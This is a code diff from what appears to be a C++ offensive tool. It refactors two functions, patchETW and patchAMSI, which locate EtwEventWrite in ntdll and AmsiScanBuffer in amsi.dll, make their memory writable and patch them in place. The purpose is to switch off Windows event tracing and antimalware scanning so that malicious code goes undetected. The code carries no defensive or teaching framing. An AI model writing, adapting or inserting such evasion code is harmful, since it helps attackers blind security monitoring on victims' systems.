@@ -789,8 +789,16 @@ DWORD patchETW(bool is32Bit = true) {
 		return 1; 
 	}
 
+	// !this check is pointless since ntdll is loaded in ever process!
+	// LoadLibraryA if it hasn't already been loaded
+    // running LoadLibraryA multiple times will not load the module repeatedly but will increase its reference count
+    HMODULE ntdll = GetModuleHandleA("ntdll");
+    if(ntdll == nullptr){
+        ntdll = LoadLibraryA("ntdll");
+    }
+
 	// Get the EventWrite function
-	void* eventWrite = GetProcAddress(LoadLibraryA("ntdll"), "EtwEventWrite");
+	void* eventWrite = GetProcAddress(ntdll, "EtwEventWrite");
 	// Allow writing to page
 	VirtualProtect(eventWrite, patchSize, PAGE_EXECUTE_READWRITE, &oldProt);
 	// Patch function
@@ -816,8 +824,15 @@ DWORD patchAMSI(bool is32Bit = true) {
 		patchSize = 6;
 	}
 
+	// LoadLibraryA if it hasn't already been loaded
+    // running LoadLibraryA multiple times will not load the module repeatedly but will increase its reference count
+    HMODULE amsi = GetModuleHandleA("amsi.dll");
+    if(amsi == nullptr){
+        amsi = LoadLibraryA("amsi.dll");
+    }
+
 	// Get the EventWrite function
-	void* eventWrite = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
+	void* eventWrite = GetProcAddress(amsi, "AmsiScanBuffer");
 	// Allow writing to page
 	VirtualProtect(eventWrite, patchSize, PAGE_EXECUTE_READWRITE, &oldProt);
 	// Patch function
